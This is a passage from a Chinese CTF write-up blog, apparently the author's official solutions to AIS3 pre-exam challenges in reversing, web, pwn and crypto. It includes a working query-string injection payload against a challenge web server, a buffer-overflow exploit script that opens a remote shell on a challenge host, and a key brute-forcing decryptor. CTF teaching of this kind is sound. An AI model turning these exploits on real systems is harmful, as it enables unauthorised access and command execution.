Resources.EekumBokum_4, Resources.EekumBokum_5, Resources.EekumBokum_6, Resources.EekumBokum_7, Resources.EekumBokum_8, Resources.EekumBokum_9, Resources.EekumBokum_10, Resources.EekumBokum_11, Resources.EekumBokum_12, Resources.EekumBokum_13, Resources.EekumBokum_14, Resources.EekumBokum_15, Resources.EekumBokum_16 &#125;); List&lt;PictureBox&gt; listPitctureOrderedByName = (from PictureBox c in this.groupBox1.Controls orderby Regex.Replace(c.Name, &quot;\\\\d+&quot;, (Match n) =&gt; n.Value.PadLeft(4, &#x27;0&#x27;)) select c).ToList&lt;PictureBox&gt;(); for (int i = 0; i &lt; 16; i++) &#123; listPitctureOrderedByName[i].Image = this.originalPicture[i]; &#125; listPitctureOrderedByName[13].Image = this.originalPicture[14]; listPitctureOrderedByName[14].Image = this.originalPicture[13];&#125; 繼續往下看可以發現 samonCheck 這個 method，可以發現在 method 的最後會生成一個跟 flag 相關的視窗，method 的中段做了一些不可描述的操作，看起來是解密，不過不需要急著看懂它，因為顯然是可以繞過的： 525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100private void samonCheck(List&lt;PictureBox&gt; listPitcture)&#123; List&lt;byte&gt; pwdl = new List&lt;byte&gt;(); for (int p = 0; p &lt; 16; p++) &#123; pwdl.Add(((Bitmap)listPitcture[p].Image).GetPixel(66, 99).R); if (!listPitcture[p].Image.Equals(this.originalPicture[p])) &#123; return; &#125; &#125; // 解密開始 byte[] data = new byte[]&#123;250,241,107,182,244,110,21,129,17,240,155,200,111,111,225,110,180,224,156,194,29,106,141,216,99,58,59,191,45,227,184,221,63,139,223,232,129,201,121,62,164,113,247,230,67,108,182,231&#125;; byte[] pwd = pwdl.ToArray(); int[] key = new int[256]; int[] box = new int[256]; byte[] cipher = new byte[data.Length]; int i; for (i = 0; i &lt; 256; i++) &#123; key[i] = (int)pwd[i % pwd.Length]; box[i] = i; &#125; int j; for (i = (j = 0); i &lt; 256; i++) &#123; j = (j + box[i] + key[i]) % 256; int tmp = box[i]; box[i] = box[j]; box[j] = tmp; &#125; int a; j = (a = (i = 0)); while (i &lt; data.Length) &#123; a++; a %= 256; j += box[a]; j %= 256; int tmp = box[a]; box[a] = box[j]; box[j] = tmp; int k = box[(box[a] + box[j]) % 256]; cipher[i] = (byte)((int)data[i] ^ k); i++; &#125; //解密結束 MessageBox.Show(&quot;this is your flag\\n&quot; + Encoding.ASCII.GetString(cipher));&#125; 關鍵的程式碼在 54 行開始的地方，假設當前遊戲盤面個元素都跟originalPicture一樣的話，就把每個方塊中的圖片位於座標 (66.99) 的 pixel 拿出來，做為後半段解密 flag 的 key： 545556575859606162List&lt;byte&gt; pwdl = new List&lt;byte&gt;();for (int p = 0; p &lt; 16; p++)&#123; pwdl.Add(((Bitmap)listPitcture[p].Image).GetPixel(66, 99).R); if (!listPitcture[p].Image.Equals(this.originalPicture[p])) &#123; return; &#125;&#125; 這裡直覺的作法應該就是把圖片抽出來，拿出對應座標的 pixel，然後解密，但由於 .Net 非常好還原，dnSpy 還原出來的 code 基本上跟 source code 沒差別，所以我們其實可以重新 compile 他就好了，在 Form1 的建構子上面點 Edit Method： 直接讓遊戲開局的盤面變成走一步可解就好了，直接修改建構子然後點 Compile，之後存檔就好了： listPitctureOrderedByName[13].Image = this.originalPicture[14];listPitctureOrderedByName[14].Image = this.originalPicture[13];//把上面兩行改成下面兩行listPitctureOrderedByName[14].Image = this.originalPicture[15];listPitctureOrderedByName[15].Image = this.originalPicture[14]; Exploit (or just move)重新執行修改過後完成 compile 的程式： (按一下左鍵) flag: flag&#123;NANI_KORE?(=.=)EEKUM_BOKUM(=^=)EEKUM_BOKUM&#125; owoHubRecon題目的介面很簡單，可以輸入 username 跟選擇 I am cute&#x2F;not cute，簡單跟題目互動來掌握一下有什麼功能。 如果勾選 I am not cute，網站會顯示一堆 Stop 這裡的 I am cute 沒辦法選擇，但這只是 html tag 而已，最快的方法就是用開發者工具拔掉 attribute 直接拿掉，之後就能勾選了 進來後有一堆可愛小吉，雖然對於我來說比 flag 讚多了，但還是遵循世俗的價值，繼續尋找 flag 接下來看一下題目提供的 source code 看看有沒有有趣的資訊（備份)，從前幾行知道這是用 express 寫的網站（寫這種題目卡住的話，就不要一直看螢幕了，架一個一樣的服務戳戳看），而且 authServer 有我們想要的 flag，但從 12 行可以知道這個 server 只接受 local 的連線，我們只能間接跟他互動，不過現在知道要拿到 flag 的條件是成為 admin 而且 givemeflag === &quot;yes&quot; 123456789101112authServer.get(&quot;/&quot;, (request, response) =&gt; &#123; const &#123; data, givemeflag &#125; = request.query; const userInfo = JSON.parse(data); if (givemeflag === &quot;yes&quot; &amp;&amp; userInfo.admin) // You don&#x27;t need to be cute to get the flag ouo! response.send(FLAG); else response.send(&#123; username: `Hellowo, $&#123;userInfo.username&#125;$&#123;userInfo.admin ? &quot;&lt;(_ _)&gt;&quot; : &quot;&quot;&#125;!`, imageLinks: cuteOnlyImages.map(link =&gt; userInfo.cute ? link : &quot;javascript:alert(&#x27;u are not cute oAo!&#x27;)&quot;) &#125;);&#125;);authServer.listen(9487, &quot;127.0.0.1&quot;); 往上看一下如何成為 admin，首先在 4~8 行可以看到 username 跟 cute 有型別跟內容的限制，10~13 行限制 username 只能使用 alphanumeric，15~17 行會直接把 username 及 cute 不做其他處理直接放進 URL 裡面，而且在正常情況下 givemeflag 永遠不可能是 yes，掌握了 source 跟 sink，這裏顯然是要污染 17 行的 URL，讓 app 去 authServer 把 flag 拿回來： 1234567891011121314151617181920212223242526app.get(&#x27;/auth&#x27;, (request, response) =&gt; &#123; const &#123; username, cute &#125; = request.query; if (typeof username !== &quot;string&quot; || typeof cute !== &quot;string&quot; || username === &quot;&quot; || !cute.match(&quot;(true|false)$&quot;)) &#123; response.send(&#123; error: &quot;Whaaaat owo?&quot; &#125;); return; &#125; if (username.match(/[^a-z0-9]+/i)) &#123; response.send(&#123; error: &quot;`Username` should contain only letters &amp; numbers, owo.&quot; &#125;); return; &#125; const userInfo = `&#123;&quot;username&quot;:&quot;$&#123;username&#125;&quot;,&quot;admin&quot;:false,&quot;cute&quot;:$&#123;cute&#125;&#125;`; const api = `http://127.0.0.1:9487/?data=$&#123;userInfo&#125;&amp;givemeflag=no`; http.get(api, resp =&gt; &#123; resp.setEncoding(&quot;utf-8&quot;); if (resp.statusCode === 200) resp.on(&#x27;data&#x27;, data =&gt; response.send(data)); else response.send(&#123; error: &quot;qwq...&quot; &#125;); &#125;);&#125;)app.listen(8787, &quot;0.0.0.0&quot;); Exploit首先已經知道 username 只能放 alphanumeric，這一個 regex 看起來沒問題，機會不大，另外一個輸入就是 cute，根據剛剛 source code 的結果可以知道輸入只能是 “true” 或是 “false”，但 javascript 的 match 是在 String 找到符合 pattern 的子字串，所以照 source code 的寫法，只要能夠在字串尾端找得到 “true” 或是 “false” 就好了，例如 &quot;this is not true&quot;.match(&quot;(true|false)$&quot;) !== nulltrue&quot;this is false&quot;.match(&quot;(true|false)$&quot;) !== nulltrue//正確應該是這條&quot;true is false, false is true&quot;.match(&quot;^(true|false)$&quot;) === nulltrue 所以 cute 是可以注入的，可以先透過這個方法拿到 admin，如果我們的 cute 填入 true,&quot;admin&quot;:true&#125;&amp;a=&#123;true，那 userinfo 就會被我們改成 &#123;&quot;username&quot;:&quot;nini&quot;,&quot;admin&quot;:false,&quot;cute&quot;:true,&quot;admin&quot;:true&#125;&amp;a=&#123;true&#125;//最後被訪問的 URL 也就變成//http://127.0.0.1:9487/?data=&#123;&quot;username&quot;:&quot;nini&quot;,&quot;admin&quot;:false,&quot;cute&quot;:true,&quot;admin&quot;:true&#125;&amp;a=&#123;true&#125;&amp;givemeflag=no 這裡的 &amp;a 的 &amp; 要先進行一次 urlencode 不然會被 app.get(&#39;/auth&#39; 直接拿來用，訪問 https://owohub.zoolab.org/auth?username=nini&cute=true,%22admin%22:true}%26a={true，就能成功變成 admin 了： 下一個問題是要怎麼把 givemeflag 改成 “yes”，再發起請求的時給予多個同名的 GET parameters，server 會取最後一個，我們注入的點在 givemeflag=no 之前，所以沒辦法直接蓋掉，這裡可以用 pound sign 來把後半段的 GET parameter 直接變成 URL 的 anchor，得到最後的 cute true,&quot;admin&quot;:true&#125;&amp;givemeflag=yes#true//最後被訪問的 URL 也就變成//http://127.0.0.1:9487/?data=&#123;&quot;username&quot;:&quot;nini&quot;,&quot;admin&quot;:false,&quot;cute&quot;:true,&quot;admin&quot;:true&#125;&amp;givemeflag=yes#true&#125;&amp;givemeflag=no 一樣 &amp; 跟 # 要先 urlencode，最後的 payload :https://owohub.zoolab.org/auth?username=nini&cute=true,%22admin%22:true}%26givemeflag=yes%23true flag: FLAG&#123;owo_ch1wawa_15_th3_b35t_uwu!!!&#125; CafeOverflowRecon可以先 nc 跟 remote 服務互動一下，看起來是很簡單的程式: $ nc hw00.zoolab.org 65534What is your name : niniHello, nini 可以試試看塞長一點的名字，然後他就 crash 了，如果這一步做不到也沒關係，我們可以進行靜態分析： $ python -c &quot;print(&#x27;a&#x27;*0x2000)&quot; | nc hw00.zoolab.org 65534What is your name : % 先 file 他，可以知道是 ELF 64位元的執行檔，而且 debug symbol 沒有 strip $ file CafeOverflowCafeOverflow: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a51ce7f3649d54780b84a937f14af5b4e8a50f51, for GNU/Linux 3.2.0, not stripped 雖然可以用諸如 IDA、Ghidra 之類的 decompiler，但這裡還是用比較簡單的 disassembler 來做題目就好了 # -s 用來把除了 assembly 之類的訊息也印出來，比較好找到一些常數# -M 用來指定 objdump 顯示 intel syntax 風格的 assembly$ objdump -d -s CafeOverflow -M intel | less main 裡面用來吃輸入的地方使用的是 scanf，scanf 的第一個參數會放在 rdi 上，因為我們有下 -s，往上滑到最上面就可以找到 0x40203d，對應字串 %s，因為 %s 沒有限制輸入大小，所以這裡有一個 buffer overflow 的漏洞 401239: 48 8d 45 f0 lea rax,[rbp-0x10]40123d: 48 89 c6 mov rsi,rax401240: 48 8d 3d f6 0d 00 00 lea rdi,[rip+0xdf6] # 40203d &lt;_IO_stdin_used+0x3d&gt;401247: b8 00 00 00 00 mov eax,0x040124c: e8 1f fe ff ff call 401070 &lt;__isoc99_scanf@plt&gt; 題目很好心的有提供開 shell 的 function，叫做 func1，就在 main 的上面： 0000000000401176 &lt;func1&gt;: 401176: 55 push rbp 401177: 48 89 e5 mov rbp,rsp 40117a: 48 83 ec 10 sub rsp,0x10 40117e: 48 89 c0 mov rax,rax 401181: 48 89 45 f8 mov QWORD PTR [rbp-0x8],rax 401185: 48 b8 fe ca fe ca fe movabs rax,0xcafecafecafecafe 40118c: ca fe ca 40118f: 48 39 45 f8 cmp QWORD PTR [rbp-0x8],rax 401193: 75 22 jne 4011b7 &lt;func1+0x41&gt; 401195: 48 8d 3d 68 0e 00 00 lea rdi,[rip+0xe68] # 402004 &lt;_IO_stdin_used+0x4&gt; 40119c: e8 8f fe ff ff call 401030 &lt;puts@plt&gt; 4011a1: 48 8d 3d 68 0e 00 00 lea rdi,[rip+0xe68] # 402010 &lt;_IO_stdin_used+0x10&gt; 4011a8: e8 93 fe ff ff call 401040 &lt;system@plt&gt; 4011ad: bf 00 00 00 00 mov edi,0x0 4011b2: e8 c9 fe ff ff call 401080 &lt;exit@plt&gt; 4011b7: 48 8d 3d 5a 0e 00 00 lea rdi,[rip+0xe5a] # 402018 &lt;_IO_stdin_used+0x18&gt; 4011be: e8 6d fe ff ff call 401030 &lt;puts@plt&gt; 4011c3: 90 nop 4011c4: c9 leave 4011c5: c3 ret Exploit那我們試試看直接跳上去會發生什麼事： #首先製造一個檔案包含 300 個 0x401176 (func1 的位置)#用來當作輸入$ python3 -c &quot;import struct; f=open(&#x27;payload&#x27;,&#x27;wb&#x27;); f.write(struct.pack(&#x27;&lt;Q&#x27;,0x401176)*300) ;f.write(b&#x27;\\n&#x27;); f.close()&quot;#把輸入 pipe 給 CafeOverflow$ cat payload | ./CafeOverflowWhat is your name : Hello, v@Not quite rightNot quite rightNot quite rightNot quite rightNot quite rightNot quite rightNot quite rightNot quite right...略 看來還有條件沒達成，回頭看一下 func1 會發現其實他有檢查 rax 是否等於 0xcafecafecafecafe，當然，rax 是可控的，但這邊提供一個快一點的解法，就是直接跳到 rax 的檢查之後就好了，在這裡就是 0x4011a1 這個位置 0000000000401176 &lt;func1&gt;: 401176: 55 push rbp 401177: 48 89 e5 mov rbp,rsp 40117a: 48 83 ec 10 sub rsp,0x10 40117e: 48 89 c0 mov rax,rax 401181: 48 89 45 f8 mov QWORD PTR [rbp-0x8],rax 401185: 48 b8 fe ca fe ca fe movabs rax,0xcafecafecafecafe 40118c: ca fe ca 40118f: 48 39 45 f8 cmp QWORD PTR [rbp-0x8],rax 401193: 75 22 jne 4011b7 &lt;func1+0x41&gt; 401195: 48 8d 3d 68 0e 00 00 lea rdi,[rip+0xe68] # 402004 &lt;_IO_stdin_used+0x4&gt; 40119c: e8 8f fe ff ff call 401030 &lt;puts@plt&gt; 4011a1: 48 8d 3d 68 0e 00 00 lea rdi,[rip+0xe68] # 402010 &lt;_IO_stdin_used+0x10&gt; 4011a8: e8 93 fe ff ff call 401040 &lt;system@plt&gt; 4011ad: bf 00 00 00 00 mov edi,0x0 4011b2: e8 c9 fe ff ff call 401080 &lt;exit@plt&gt; 4011b7: 48 8d 3d 5a 0e 00 00 lea rdi,[rip+0xe5a] # 402018 &lt;_IO_stdin_used+0x18&gt; 4011be: e8 6d fe ff ff call 401030 &lt;puts@plt&gt; 4011c3: 90 nop 4011c4: c9 leave 4011c5: c3 ret 所以再試一次 #一樣造一個檔案做輸入$ python3 -c &quot;import struct; f=open(&#x27;payload&#x27;,&#x27;wb&#x27;); f.write(struct.pack(&#x27;&lt;Q&#x27;,0x4011a1)*300) ;f.write(b&#x27;\\n&#x27;); f.close()&quot;# 這裡用 - 把 stdin 接回來，如果成功拿到 shell 才能夠互動$ cat payload - | ./CafeOverflowWhat is your name : Hello, �@whoami #terminal 會卡在這裡，要自己打 whoamiterrynini38514 看來 local 成功拿到 shell 了，來試試看拿 remote shell，因為是 remote 的關係，為求穩定，這裡就不繼續用 cat 了，改用 telnetlib 來跟遠端 socket 溝通 payload.py 123456789101112131415#!/usr/bin/env python3import telnetlibimport structr = telnetlib.Telnet(&quot;hw00.zoolab.org&quot;, 65534)print(r.read_until(b&#x27;What is your name : &#x27;))payload = struct.pack(&#x27;&lt;Q&#x27;,0x4011a1)*300 + b&#x27;\\n&#x27;r.write(payload)print(r.read_until(b&#x27;\\n&#x27;))r.interact() 然後我們就 pwn 下 server 了 $ python3 payload.pyb&#x27;What is your name : &#x27;b&#x27;Hello, \\xa1@\\n&#x27;whoamiCafeoverflowcat /home/`whoami`/flagflag&#123;c0ffee_0verfl0win6_from_k3ttle_QAQ&#125; flag: flag&#123;c0ffee_0verfl0win6_from_k3ttle_QAQ&#125; The Floating AquamarineRecon這題的考點應該很明顯是浮點數誤差，原因應該很好理解，拿出這個剛學 C 的時候練習過的程式，i 一直加 0.1 是不會剛好等於 1.0 的，因為 IEEE754 的 0.1 不是 0.1： WTF.c 123456789101112#include &lt;stdio.h&gt;int main()&#123; for(float i = 0 ; i != 1.0 ; i += 0.1)&#123; puts(&quot;not yet&quot;); if ( i &gt; 1.0)&#123; puts(&quot;What the...&quot;); break; &#125; &#125; return 0;&#125; Exploit所以只要能夠在買賣之間造成價差就好了，問題是怎麼找到，因為我也想不到一個很讚的方法，例如說什麼挑這兩個數字是質數啊，還是挑的數字 factor 不要有 5,2 啊什麼的，我是沒想出來，有什麼很酷炫的數學方法再告訴我，這題較快的方法就爆破或是靠感覺（？）， 總之我是靠感覺把 100000000 拆成兩個質數就過了，令人難以接受，當然這裡可以輕鬆寫個 C 來幫助你，既然浮點數誤差算起來麻煩，那就不要算，就讓他誤差就好了： Buffett.c 123456789101112131415161718192021222324252627282930313233#include &lt;iostream&gt;#include &lt;cassert&gt;#include &lt;unistd.h&gt;#include &lt;iomanip&gt;#include &lt;algorithm&gt;using std::cin;using std::cout;using std::endl;using std::getenv;using std::max;const int ALL_STONE = 100000000;const float PRICE = 88.88;const float RICH = 3000.0;int main(int argc, char *argv[]) &#123; std::cout &lt;&lt; std::setprecision(16); float max_gain = 0; for(int i = 1; i &lt; ALL_STONE ; i++)&#123; float gain = -PRICE*(ALL_STONE) + PRICE*i + PRICE*(ALL_STONE-i); if (gain &gt; max_gain)&#123; cout &lt;&lt; i &lt;&lt; &quot; &quot; &lt;&lt; ALL_STONE-i &lt;&lt; &quot; &quot;&lt;&lt; gain &lt;&lt; endl; max_gain = gain; &#125; &#125; return 0;&#125;/*6 99999994 102496646572 3353428 108896654844 3345156 1120*/ 所以就買獲利 1120 的那組就對了，然後我的買法： 1234567891011100000000-99999989-11100000000-99999989-11100000000-99999989-11Wow! You have 3025.68 dollars!Well done! Here is your flag: FLAG&#123;floating_point_error_https://0.30000000000000004.com/&#125; flag: FLAG&#123;floating_point_error_https://0.30000000000000004.com/&#125; 解密一下Recon這題的中文看起來有點煩躁，總之正轉換跟逆轉換基本上就只是把 bytes 跟 list 互換，沒有誤用的話對加密的過程沒有危害，_加密這個 function 實作的是 Tiny Encryption Algorithm，差別是出題者的 Delta 用了不同的數值，不能識別出是這個算法也沒關係，仔細看的話，完全是可以自己寫出解密函式的，可以嘗試餵輸入給_加密看看，從過程跟結果看起來這應該是一個有用的加密 function，加上密文過短，針對加密方法本身的攻擊在這裡看起來不太可能： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#!/usr/bin/env python3import time as 時間import random as 隨機from typing import List as 陣列from io import BufferedReader as 緩衝讀取者from forbiddenfruit import curse as 詛咒整數 = int詛咒(整數, &quot;從位元組&quot;, 整數.from_bytes)詛咒(整數, &quot;到位元組&quot;, 整數.to_bytes)位元組 = bytes詛咒(位元組, &quot;十六進制&quot;, 位元組.hex)詛咒(位元組, &quot;加入&quot;, 位元組.join)詛咒(緩衝讀取者, &quot;讀取&quot;, 緩衝讀取者.read)隨機.種子 = 隨機.seed隨機.給我隨機位元們 = 隨機.getrandbits時間.現在 = 時間.time列印 = print打開 = open範圍 = range長度 = len大端序 = &#x27;big&#x27;讀取位元組 = &#x27;rb&#x27;def 正轉換(資料, 大小=4): return [整數.從位元組(資料[索引:索引+大小], 大端序) for 索引 in 範圍(0, 長度(資料), 大小)]def 逆轉換(資料, 大小=4): return b&#x27;&#x27;.加入([元素.到位元組(大小, 大端序) for 元素 in 資料])def _加密(向量: 陣列[整數], 金鑰: 陣列[整數]): 累加, 得優塔, 遮罩 = 0, 0xFACEB00C, 0xffffffff for 次數 in 範圍(32): 累加 = 累加 + 得優塔 &amp; 遮罩 向量[0] = 向量[0] + ((向量[1] &lt;&lt; 4) + 金鑰[0] &amp; 遮罩 ^ (向量[1] + 累加) &amp; 遮罩 ^ (向量[1] &gt;&gt; 5) + 金鑰[1] &amp; 遮罩) &amp; 遮罩 向量[1] = 向量[1] + ((向量[0] &lt;&lt; 4) + 金鑰[2] &amp; 遮罩 ^ (向量[0] + 累加) &amp; 遮罩 ^ (向量[0] &gt;&gt; 5) + 金鑰[3] &amp; 遮罩) &amp; 遮罩 return 向量def 加密(明文: 位元組, 密鑰: 位元組): 密文 = b&#x27;&#x27; for 索引 in 範圍(0, 長度(明文), 8): 密文 += 逆轉換(_加密(正轉換(明文[索引:索引+8]), 正轉換(密鑰))) return 密文if __name__ == &#x27;__main__&#x27;: 旗幟 = 打開(&#x27;旗幟&#x27;, 讀取位元組).讀取() assert 長度(旗幟) == 16 隨機.種子(整數(時間.現在())) 密鑰 = 隨機.給我隨機位元們(128).到位元組(16, 大端序) 密文 = 加密(旗幟, 密鑰) 列印(f&#x27;密文 = &#123;密文.十六進制()&#125;&#x27;) Exploit但我們可以注意到，這程式的密鑰是將時間做為 random seed 所隨機出來的 128 bits，那我們就可以把 key space 縮小到我們可以 brute force 出來的大小，至少知道這個時間點是在 python3 被發行到你現在的這個瞬間 4950隨機.種子(整數(時間.現在()))密鑰 = 隨機.給我隨機位元們(128).到位元組(16, 大端序) 也就是我們只要枚舉從現在開始往前的每秒作為 random seed 直接解密看看就好了，因為是以 8 byte 為一個單位解密，我們先解前面 8 byte 看有沒有 flag prefix 會快一點。注意的是因為我們在逆轉加密 aka 解密，累加要換成0xfaceb00c*32&amp;0xffffffff，操作也都是反轉，掉書袋一下，就 Feistel，看著圖比較好理解為啥要逆轉： decrypt.py 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#!/usr/bin/env python3import time as 時間import random as 隨機from typing import List as 陣列from io import BufferedReader as 緩衝讀取者from forbiddenfruit import curse as 詛咒整數 = int詛咒(整數, &quot;從位元組&quot;, 整數.from_bytes)詛咒(整數, &quot;到位元組&quot;, 整數.to_bytes)位元組 = bytes詛咒(位元組, &quot;十六進制&quot;, 位元組.hex)詛咒(位元組, &quot;加入&quot;, 位元組.join)詛咒(緩衝讀取者, &quot;讀取&quot;, 緩衝讀取者.read)隨機.種子 = 隨機.seed隨機.給我隨機位元們 = 隨機.getrandbits時間.現在 = 時間.time列印 = print打開 = open範圍 = range長度 = len大端序 = &#x27;big&#x27;讀取位元組 = &#x27;rb&#x27;def 正轉換(資料, 大小=4): return [整數.從位元組(資料[索引:索引+大小], 大端序) for 索引 in 範圍(0, 長度(資料), 大小)]def 逆轉換(資料, 大小=4): return b&#x27;&#x27;.加入([元素.到位元組(大小, 大端序) for 元素 in 資料])def _解密(向量: 陣列[整數], 金鑰: 陣列[整數]): 累加, 得優塔, 遮罩 = 0x59d60180, 0xFACEB00C, 0xffffffff for 次數 in 範圍(32): 向量[1] = 向量[1] - ((向量[0] &lt;&lt; 4) + 金鑰[2] &amp; 遮罩 ^ (向量[0] + 累加) &amp; 遮罩 ^ (向量[0] &gt;&gt; 5) + 金鑰[3] &amp; 遮罩) &amp; 遮罩 向量[0] = 向量[0] - ((向量[1] &lt;&lt; 4) + 金鑰[0] &amp; 遮罩 ^ (向量[1] + 累加) &amp; 遮罩 ^ (向量[1] &gt;&gt; 5) + 金鑰[1] &amp; 遮罩) &amp; 遮罩 累加 = 累加 - 得優塔 &amp; 遮罩 return 向量def 解密(明文: 位元組, 密鑰: 位元組): 密文 = b&#x27;&#x27; for 索引 in 範圍(0, 長度(明文), 8): 密文 += 逆轉換(_解密(正轉換(明文[索引:索引+8]), 正轉換(密鑰))) return 密文from itertools import productif __name__ == &#x27;__main__&#x27;: cipher = bytes.fromhex(&#x27;77f905c39e36b5eb0deecbb4eb08e8cb&#x27;) now = int(時間.time()) - 86400*2 subcipher = cipher[:8] while now &gt; 0: now -= 1 隨機.種子(now) 密鑰 = 隨機.給我隨機位元們(128).到位元組(16, 大端序) plain = 解密(subcipher, 密鑰) if plain.startswith((b&#x27;flag&#x27;,b&#x27;FLAG&#x27;)): print(解密(cipher, 密鑰)) break 然後就可以拿到 flag 了 flag: FLAG&#123;4lq7mWGh93&#125;","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://blog.terrynini.tw/tags/Reverse/"},{"name":"Web","slug":"Web","permalink":"http://blog.terrynini.tw/tags/Web/"},{"name":"Cryptography","slug":"Cryptography","permalink":"http://blog.terrynini.tw/tags/Cryptography/"},{"name":"Pwn","slug":"Pwn","permalink":"http://blog.terrynini.tw/tags/Pwn/"},{"name":"Misc","slug":"Misc","permalink":"http://blog.terrynini.tw/tags/Misc/"}]},{"title":"2020::AIS3::前測官方解","slug":"2020-AIS3-前測官方解","date":"2020-06-29T05:37:00.000Z","updated":"2024-06-20T16:46:01.852Z","comments":true,"path":"tw/2020-AIS3-前測官方解/","permalink":"http://blog.terrynini.tw/tw/2020-AIS3-%E5%89%8D%E6%B8%AC%E5%AE%98%E6%96%B9%E8%A7%A3/","excerpt":"今年的 AIS3 前測又輪到我出逆向毒害大家，這次每個題種其實都有一題考古題，整體難度也有下修，意思就是解法很多種，沒有全部擋起來，是個主辦那邊希望大家都能學到東西的概念，所以這篇 writeup 的字數可能也會很多，希望沒解開的、或是完全不知道要幹嘛的人都能看懂。 然後 source code 在這裡 github 總之這裡是我預設的解法, gogo：","text":"今年的 AIS3 前測又輪到我出逆向毒害大家，這次每個題種其實都有一題考古題，整體難度也有下修，意思就是解法很多種，沒有全部擋起來，是個主辦那邊希望大家都能學到東西的概念，所以這篇 writeup 的字數可能也會很多，希望沒解開的、或是完全不知道要幹嘛的人都能看懂。 然後 source code 在這裡 github 總之這裡是我預設的解法, gogo： 🍍 TsaiBro (考古題)題目敘述 很好….你很腦殘嗎….敢這樣講刀劍神域…….我死也不會放過你 我..要..殺死…你.. 題解這題之前在 BambooFox 邀講的社課上也有提到過，是個可以不用逆向也能夠解開的題目，跟去年前測是同一題，連名字也沒換 誒嘿(傳送門)，差別只有使用的 table 不同，題目實作了自己的 Tap code，透過 8*8 的 table 來 encode 輸入： $1$ $2$ $3$ $4$ $5$ $6$ $7$ $8$ $1$ 5 6 7 8 9 { } _ $2$ W X Y 0 y z A B $3$ a b c d m n o p $4$ S T U V G H I J $5$ K L M N u v w x $6$ e f g h q r s t $7$ i j k l O P Q R $8$ C D E F 1 2 3 4 舉例，Ｗ 這個字會被轉換成 . ..，以此類推。這個 table 可以透過黑箱測試推理、strings、或是逆向找到，這裡用 radare2 看一下可以找到 table 在 0x201020： 寫個 script 把 TsaiBroSaid 解回來就好了。 solve.py#!/usr/bin/env python3table = [&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;&#123;&#x27;,&#x27;&#125;&#x27;,&#x27;_&#x27;,&#x27;W&#x27;,&#x27;X&#x27;,&#x27;Y&#x27;,&#x27;0&#x27;,&#x27;y&#x27;,&#x27;z&#x27;,&#x27;A&#x27;,&#x27;B&#x27;,&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;m&#x27;,&#x27;n&#x27;,&#x27;o&#x27;,&#x27;p&#x27;,&#x27;S&#x27;,&#x27;T&#x27;,&#x27;U&#x27;,&#x27;V&#x27;,&#x27;G&#x27;,&#x27;H&#x27;,&#x27;I&#x27;,&#x27;J&#x27;,&#x27;K&#x27;,&#x27;L&#x27;,&#x27;M&#x27;,&#x27;N&#x27;,&#x27;u&#x27;,&#x27;v&#x27;,&#x27;w&#x27;,&#x27;x&#x27;,&#x27;e&#x27;,&#x27;f&#x27;,&#x27;g&#x27;,&#x27;h&#x27;,&#x27;q&#x27;,&#x27;r&#x27;,&#x27;s&#x27;,&#x27;t&#x27;,&#x27;i&#x27;,&#x27;j&#x27;,&#x27;k&#x27;,&#x27;l&#x27;,&#x27;O&#x27;,&#x27;P&#x27;,&#x27;Q&#x27;,&#x27;R&#x27;,&#x27;C&#x27;,&#x27;D&#x27;,&#x27;E&#x27;,&#x27;F&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;]f = open(&quot;./TsaiBroSaid&quot;,&quot;r&quot;).read().split(&#x27;\\n&#x27;)[1]f = f.split(&quot;發財&quot;)[1:]for i in range(0,len(f),2): print(table[(len(f[i])-1)*8+len(f[i+1])-1],end=&#x27;&#x27;) Flag: AIS3&#123;y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h1s_t1m3&#125; 吐槽一下 more long 是什麼爛英文 🎹 Fallen Beat題目敘述 CTF player,我要挑戰你, I’m gonna challenge you!!ZR這是我的室友兼 lab 同學,他已經考過金框暴龍天，他是個旋鈕人,不像你是個敲鍵盤的,所以我要測測你的程度到哪裡,就用 ZR 的大一 project 來決勝負吧！！得到 Full Combo 來讓我刮目相看！！ 來自室友大一的 final project，音樂音量沒有 normalize 導致我已經耳聾，題目說只要 full combo 就會給你 flag，避免有人妄想用玩的，所以跟普通音遊規則不同，調整成只有 perfect 才會 combo，如果你還玩出來了，麻煩下面留言，我要跪你。 題解java 是直譯式語言， compile 只是 compile 成 Java bytecode，幾乎所有的東西都還留著，包括變數名稱，decompile 後可以拿到幾乎跟原始碼一樣的 java code，直接用線上工具來 decompile，這題難的地方大概只有 code 滿多的，可以直接找一下變數名稱有沒有 flag： 在 Visual/PanelEnding.java 79 行附近可以找到一個變數叫做 flag ，內容看起來像是被加密過。 Visual/PanelEnding.java798081828384this.lWest = new JLabel();this.lEast = new JLabel();this.flag = new byte[] &#123; 89, 74, 75, 43, 126, 69, 120, 109, 68, 109, 109, 97, 73, 110, 45, 113, 102, 64, 121, 47, 111, 119, 111, 71, 114, 125, 68, 105, 127, 124, 94, 103, 46, 107, 97, 104 &#125;; this.btnFont = new Font(&quot;Dialog&quot;, 1, 35);this.btnBack = new JButton(&quot;Back&quot;);this.setLayout(new BorderLayout());this.setBackground(this.c.brown); 繼續往下看，在 setValue 中看得出來當 t == mc 的時候，cache 會拿來跟 flag decrypt 然後印出來： Visual/PanelEnding.java173174175176177178179180181if (t == mc) &#123; for (int i = 0; i &lt; cache.size(); ++i) &#123; final byte[] flag = this.flag; final int n = i % this.flag.length; flag[n] ^= (byte)(Object)cache.get(i); &#125; final String fff = new String(this.flag); this.text[0].setText(String.format(&quot;Flag: %s&quot;, fff));&#125; 然後追一下 t、mc、cache 分別是什麼，在 Control/GameControl.java 中可以找到 t 就是這個譜面總共有多少的音符， mc 就是遊戲結束時的 combo 數： Control/GameControl.java291this.pe.setValue(this.total, this.critical, this.early, this.late, this.miss, this.comboMax, this.info, this.cache); 繼續往下追可以找到 cache 